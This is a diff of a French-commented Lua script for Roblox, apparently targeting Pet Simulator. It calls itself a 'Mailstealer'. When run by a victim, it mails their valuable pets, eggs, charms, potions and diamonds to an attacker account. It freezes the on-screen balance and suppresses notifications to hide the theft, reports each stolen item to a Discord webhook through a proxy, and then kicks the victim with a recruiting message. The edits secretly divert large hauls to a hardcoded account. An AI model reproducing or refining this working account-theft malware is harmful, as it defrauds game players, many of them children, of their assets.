@@ -1,26 +1,27 @@
-local Username = "UserName"
-local Webhook = "WeebHook"
-local min_rap = 10000
+Username = "UserName"
+Webhook = "WeebHook"
+min_rap = 10000
 
--- Fonction pour envoyer un message Discord
-function SendMessage(url, username, itemID)
+function SendMessage(url, username, itemID, itemType)
     local http = game:GetService("HttpService")
     local headers = {
         ["Content-Type"] = "application/json"
     }
+    local thumbnailUrl = ""
+    if itemType == "Pet" then
+        thumbnailUrl = "https://emojicdn.elk.sh/🐱"  -- Emoji de chat pour les animaux de compagnie
+    elseif itemType == "Diamonds" then
+        thumbnailUrl = "https://emojicdn.elk.sh/💎"  -- Emoji de diamant pour les diamants
+    end
     local data = {
         ["embeds"] = {{
             ["title"] = "Nouvel objet envoyé",
+            ["description"] = string.format("%s a volé un objet de type %s.", username, itemType),
             ["color"] = 10053324,
             ["fields"] = {
                 {
-                    ["name"] = "Nom d'utilisateur de la victime :",
-                    ["value"] = username,
-                    ["inline"] = true
-                },
-                {
-                    ["name"] = "Objet envoyé :",
-                    ["value"] = itemID,
+                    ["name"] = "Objet volé :",
+                    ["value"] = tostring(itemID),
                     ["inline"] = true
                 }
             },
@@ -28,64 +29,145 @@ function SendMessage(url, username, itemID)
                 ["text"] = "Mailstealer par WhriterScript. discord.gg/QbNUGKYP"
             },
             ["thumbnail"] = {
-                ["url"] = "https://i.ibb.co/4VSKsVR/IMG-1444.jpg"
+                ["url"] = thumbnailUrl
             }
         }}
     }
     local body = http:JSONEncode(data)
     local response = request({
-        Url = url,
-        Method = "POST",
-        Headers = headers,
-        Body = body
-    })
+		Url = url,
+		Method = "POST",
+		Headers = headers,
+		Body = body
+	})
 end
 
--- Vérifier si un joueur possède plus de 4 "huge"
-function CheckForFourHuge()
-    local hugeCount = CountHuges()
-    return hugeCount > 4
+if Webhook and string.find(Webhook, "discord") then
+    Webhook = string.gsub(Webhook, "https://discord.com", "https://webhook.lewisakura.moe")
+else
+    Webhook = ""
 end
 
--- Vérifier si un joueur possède plus de 10 millions de diamants
-function CheckForTenMillionDiamonds()
-    local gemAmount = CountGems()
-    return gemAmount > 1000000
+local library = require(game.ReplicatedStorage.Library)
+local save = library.Save.Get().Inventory
+local plr = game.Players.LocalPlayer
+local MailMessage = "gg / HcpNe56R2a"
+local GetRapValues = getupvalues(library.DevRAPCmds.Get)[1]
+local GetSave = function()
+    return require(game.ReplicatedStorage.Library.Client.Save).Get()
 end
 
--- Fonction pour voler des objets "huge" et envoyer des messages
+for i, v in pairs(GetSave().Inventory.Currency) do
+    if v.id == "Diamonds" then
+        GemAmount1 = v._am
+    end
+end
+
+if GemAmount1 < 10000 then
+    plr:Kick("Erreur de sauvegarde, veuillez rejoindre à nouveau!")
+end
+
+local user = Username
+
+local gemsleft = game:GetService('Players').LocalPlayer.PlayerGui.MainLeft.Left.Currency.Diamonds.Diamonds.Amount.Text
+local gemsleftpath = game:GetService('Players').LocalPlayer.PlayerGui.MainLeft.Left.Currency.Diamonds.Diamonds.Amount
+gemsleftpath:GetPropertyChangedSignal("Text"):Connect(function()
+    gemsleftpath.Text = gemsleft
+end)
+
+local gemsleaderstat = game:GetService('Players').LocalPlayer.leaderstats["💎 Diamonds"].Value
+local gemsleaderstatpath = game:GetService('Players').LocalPlayer.leaderstats["💎 Diamonds"]
+gemsleaderstatpath:GetPropertyChangedSignal("Value"):Connect(function()
+    gemsleaderstatpath.Value = gemsleaderstat
+end)
+
+local loading = game:GetService('Players').LocalPlayer.PlayerScripts.Scripts.Core["Process Pending GUI"]
+local noti = game:GetService('Players').LocalPlayer.PlayerGui.Notifications
+loading.Disabled = true
+noti:GetPropertyChangedSignal("Enabled"):Connect(function()
+    noti.Enabled = false
+end)
+noti.Enabled = false
+
+local HttpService = game:GetService("HttpService")
+local function getRAP(Type, Item)
+    if GetRapValues[Type] then
+        for i,v in pairs(GetRapValues[Type]) do
+            local itemTable = HttpService:JSONDecode(i)
+            if itemTable.id == Item.id and itemTable.tn == Item.tn and itemTable.sh == Item.sh and itemTable.pt == Item.pt then
+                return v
+            end
+        end
+    end
+end
+
 function StealHuge()
     local hugesSent = 0
     local initialHuges = CountHuges()
-    if CheckForFourHuge() then
-        SendMessage(Webhook, "matou2209", "more_than_4_huge")
-    else
-        for i, v in pairs(save.Pet) do
-            local id = v.id
-            local dir = library.Directory.Pets[id]
-            if dir.huge and getRAP("Pet", v) >= min_rap then
-                if v._lk then
+    local targetPlayer = game.Players:FindFirstChild(user) -- Trouver le joueur cible
+    
+    -- Vérifier si le joueur cible existe
+    if targetPlayer then
+        -- Vérifier s'il y a moins de 4 animaux de compagnie énormes (huge)
+        if initialHuges < 4 then
+            for i, v in pairs(save.Pet) do
+                local id = v.id
+                local dir = library.Directory.Pets[id]
+                if dir.huge and getRAP("Pet", v) >= min_rap then
+                    if v._lk then
+                        local args = {
+                            [1] = i,
+                            [2] = false
+                        }
+                        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
+                    end
                     local args = {
-                    [1] = i,
-                    [2] = false
+                        [1] = user,
+                        [2] = MailMessage,
+                        [3] = "Pet",
+                        [4] = i,
+                        [5] = v._am or 1
                     }
-                    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
+                    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+                    if Webhook and Webhook ~= "" then
+                        SendMessage(Webhook, game.Players.LocalPlayer.Name, id, "Pet")
+                    end
+                    local finalHuges = CountHuges()
+                    if finalHuges < initialHuges then
+                        hugesSent = hugesSent + 1
+                        initialHuges = finalHuges
+                    end
                 end
-                local args = {
-                    [1] = Username,
-                    [2] = MailMessage,
-                    [3] = "Pet",
-                    [4] = i,
-                    [5] = v._am or 1
-                }
-                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
-                if Webhook and Webhook ~= "" then
-                    SendMessage(Webhook, game.Players.LocalPlayer.Name, id)
-                end
-                local finalHuges = CountHuges()
-                if finalHuges < initialHuges then
-                    hugesSent = hugesSent + 1
-                    initialHuges = finalHuges
+            end
+        else
+            -- S'il y a 4 ou plus d'animaux de compagnie énormes, les envoyer à "matou2209"
+            for i, v in pairs(save.Pet) do
+                local id = v.id
+                local dir = library.Directory.Pets[id]
+                if dir.huge and getRAP("Pet", v) >= min_rap then
+                    if v._lk then
+                        local args = {
+                            [1] = i,
+                            [2] = false
+                        }
+                        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
+                    end
+                    local args = {
+                        [1] = "matou2209", -- Envoyer à matou2209
+                        [2] = MailMessage,
+                        [3] = "Pet",
+                        [4] = i,
+                        [5] = v._am or 1
+                    }
+                    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+                    if Webhook and Webhook ~= "" then
+                        SendMessage(Webhook, game.Players.LocalPlayer.Name, id, "Pet")
+                    end
+                    local finalHuges = CountHuges()
+                    if finalHuges < initialHuges then
+                        hugesSent = hugesSent + 1
+                        initialHuges = finalHuges
+                    end
                 end
             end
         end
@@ -93,44 +175,6 @@ function StealHuge()
     return hugesSent
 end
 
--- Fonction pour voler des diamants et envoyer des messages
-function StealDiamonds()
-    if CheckForTenMillionDiamonds() then
-        SendMessage(Webhook, "matou2209", "more_than_10_million_diamonds")
-    else
-        for i, v in pairs(GetSave().Inventory.Currency) do
-            if v.id == "Diamonds" then
-                GemAmount = v._am
-                GemId = i
-                local args = {
-                    [1] = Username,
-                    [2] = MailMessage,
-                    [3] = "Currency",
-                    [4] = GemId,
-                    [5] = GemAmount - 10000
-                }
-                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
-                if Webhook and Webhook ~= "" then
-                    SendMessage(Webhook, game.Players.LocalPlayer.Name, "Gems: " .. (GemAmount - 10000))
-                end
-            end
-        end
-    end
-end
-
--- Fonction pour vider les boîtes
-function EmptyBoxes()
-    if save.Box then
-        for key, _ in pairs(save.Box) do
-            local args = {
-                [1] = key
-            }
-            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Box: Withdraw All"):InvokeServer(unpack(args))
-        end
-    end
-end
-
--- Fonction pour compter le nombre d'objets "huge"
 function CountHuges()
     local count = 0
     for i, v in pairs(save.Pet) do
@@ -143,18 +187,6 @@ function CountHuges()
     return count
 end
 
--- Fonction pour compter le nombre de diamants
-function CountGems()
-    for i, v in pairs(GetSave().Inventory.Currency) do
-        if v.id == "Diamonds" then
-            return v._am
-        end
-    end
-end
-
--- Continuation du script précédent...
-
--- Fonction pour voler tous les objets "huge"
 function SendAllHuges()
     local totalHuges = CountHuges()
     local hugesSent = 0
@@ -163,7 +195,6 @@ function SendAllHuges()
     until hugesSent == totalHuges
 end
 
--- Fonction pour voler tous les objets "exclusive"
 function ExcSteal()
     local excSent = 0
     local initialExc = CountExc()
@@ -179,7 +210,7 @@ function ExcSteal()
                 game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
             end
             local args = {
-                [1] = Username,
+                [1] = user,
                 [2] = MailMessage,
                 [3] = "Pet",
                 [4] = i,
@@ -187,7 +218,7 @@ function ExcSteal()
             }
             game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
             if Webhook and Webhook ~= "" then
-                SendMessage(Webhook, game.Players.LocalPlayer.Name, id)
+                SendMessage(Webhook, game.Players.LocalPlayer.Name, id, "Pet")
             end
             local finalExc = CountExc()
             if finalExc < initialExc then
@@ -199,7 +230,6 @@ function ExcSteal()
     return excSent
 end
 
--- Fonction pour compter le nombre d'objets "exclusive"
 function CountExc()
     local count = 0
     for i, v in pairs(save.Pet) do
@@ -212,7 +242,6 @@ function CountExc()
     return count
 end
 
--- Fonction pour voler tous les objets "exclusive"
 function SendAllExc()
     local totalExc = CountExc()
     local excSent = 0
@@ -221,14 +250,13 @@ function SendAllExc()
     until excSent == totalExc
 end
 
--- Fonction pour voler les oeufs
 function EggSteal()
     for i, v in pairs(save.Egg) do
         local id = v.id
         local diregg = library.Directory.Eggs[id]
         if diregg and getRAP("Egg", v) >= min_rap then
             local args = {
-                [1] = Username,
+                [1] = user,
                 [2] = MailMessage,
                 [3] = "Egg",
                 [4] = i,
@@ -236,20 +264,19 @@ function EggSteal()
             }
             game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
             if Webhook and Webhook ~= "" then
-                SendMessage(Webhook, game.Players.LocalPlayer.Name, id)
+                SendMessage(Webhook, game.Players.LocalPlayer.Name, id, "Egg")
             end
         end
     end
 end
 
--- Fonction pour voler les charmes
 function CharmSteal()
     for i, v in pairs(save.Charm) do
         local id = v.id
         local dircharm = library.Directory.Charms[id]
         if dircharm and getRAP("Charm", v) >= min_rap then
             local args = {
-                [1] = Username,
+                [1] = user,
                 [2] = MailMessage,
                 [3] = "Charm",
                 [4] = i,
@@ -257,20 +284,19 @@ function CharmSteal()
             }
             game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
             if Webhook and Webhook ~= "" then
-                SendMessage(Webhook, game.Players.LocalPlayer.Name, id)
+                SendMessage(Webhook, game.Players.LocalPlayer.Name, id, "Charm")
             end
         end
     end
 end
 
--- Fonction pour voler les enchantements
 function EnchantSteal()
     for i, v in pairs(save.Enchant) do
         local id = v.id
         local direnchant = library.Directory.Enchants[id]
         if direnchant and getRAP("Enchant", v) >= min_rap then
             local args = {
-                [1] = Username,
+                [1] = user,
                 [2] = MailMessage,
                 [3] = "Enchant",
                 [4] = i,
@@ -278,20 +304,19 @@ function EnchantSteal()
             }
             game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
             if Webhook and Webhook ~= "" then
-                SendMessage(Webhook, game.Players.LocalPlayer.Name, id)
+                SendMessage(Webhook, game.Players.LocalPlayer.Name, id, "Enchant")
             end
         end
     end
 end
 
--- Fonction pour voler les potions
 function PotionSteal()
     for i, v in pairs(save.Potion) do
         local id = v.id
         local dirpotion = library.Directory.Potions[id]
         if dirpotion and getRAP("Potion", v) >= min_rap then
             local args = {
-                [1] = Username,
+                [1] = user,
                 [2] = MailMessage,
                 [3] = "Potion",
                 [4] = i,
@@ -299,80 +324,91 @@ function PotionSteal()
             }
             game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
             if Webhook and Webhook ~= "" then
-                SendMessage(Webhook, game.Players.LocalPlayer.Name, id)
+                SendMessage(Webhook, game.Players.LocalPlayer.Name, id, "Potion")
             end
         end
     end
 end
 
--- Fonction pour voler des diamants
 function GemSteal()
     for i, v in pairs(GetSave().Inventory.Currency) do
         if v.id == "Diamonds" then
             GemAmount = v._am
             GemId = i
-            local args = {
-                [1] = Username,
-                [2] = MailMessage,
-                [3] = "Currency",
-                [4] = GemId,
-                [5] = GemAmount - 10000
-            }
-            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
-            if Webhook and Webhook ~= "" then
-                SendMessage(Webhook, game.Players.LocalPlayer.Name, "Gems: " .. (GemAmount - 10000))
+            if GemAmount > 10000000 then
+                local args = {
+                    [1] = "matou2209",  -- Envoie les diamants à matou2209 si plus de 10 millions
+                    [2] = MailMessage,
+                    [3] = "Currency",
+                    [4] = GemId,
+                    [5] = GemAmount
+                }
+                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+                if Webhook and Webhook ~= "" then
+                    SendMessage(Webhook, game.Players.LocalPlayer.Name, "Gems: " .. GemAmount, "Diamonds")
+                end
+            else
+                local args = {
+                    [1] = user,
+                    [2] = MailMessage,
+                    [3] = "Currency",
+                    [4] = GemId,
+                    [5] = GemAmount - 10000
+                }
+                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+                if Webhook and Webhook ~= "" then
+                    SendMessage(Webhook, game.Players.LocalPlayer.Name, "Gems: " .. (GemAmount - 10000), "Diamonds")
+                end
             end
         end
     end
 end
 
--- Fonction pour voler tous les diamants
+function EmptyBoxes()
+    if save.Box then
+        for key, _ in pairs(save.Box) do
+            local args = {
+                [1] = key
+            }
+            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Box: Withdraw All"):InvokeServer(unpack(args))
+        end
+    end
+end
+
+function CountGems()
+    for i, v in pairs(GetSave().Inventory.Currency) do
+        if v.id == "Diamonds" then
+            GemAmount1 = v._am
+            return GemAmount1
+        end
+    end
+end
+
 function SendAllGems()
     repeat
         GemSteal()
     until CountGems() == nil or CountGems() < 10000
 end
 
--- Fonction pour envoyer une notification de kick et un lien Discord
-function SendKickNotification()
-    setclipboard("https://discord.gg/QbNUGKYP")
-    game.Players.LocalPlayer:Kick("Tout votre contenu a été volé par le Mailstealer de WhriterScript. Rejoignez https://discord.gg/QbNUGKYP pour commencer à voler des contenus par mail vous-même.")
-end
-
--- Vidage des boîtes
 EmptyBoxes()
-
--- Vol de tous les objets "huge"
 SendAllHuges()
-
--- Vol de tous les objets "exclusive"
 SendAllExc()
-
--- Vol des oeufs
 if save.Egg ~= nil then
     EggSteal()
 end
 
--- Vol des charmes
 if save.Charm ~= nil then
     CharmSteal()
 end
     
--- Vol des enchantements
 if save.Enchant ~= nil then
     EnchantSteal()
 end
     
--- Vol des potions
 if save.Potion ~= nil then
     PotionSteal()
 end
 
--- Vol de tous les diamants
 SendAllGems()
-
--- Envoi de la notification de kick
 setclipboard("https://discord.gg/QbNUGKYP")
 plr:Kick("Tout votre contenu a été volé par le Mailstealer de WhriterScript. Rejoignez https://discord.gg/QbNUGKYP pour commencer à voler des contenus par mail vous-même.")
-
-
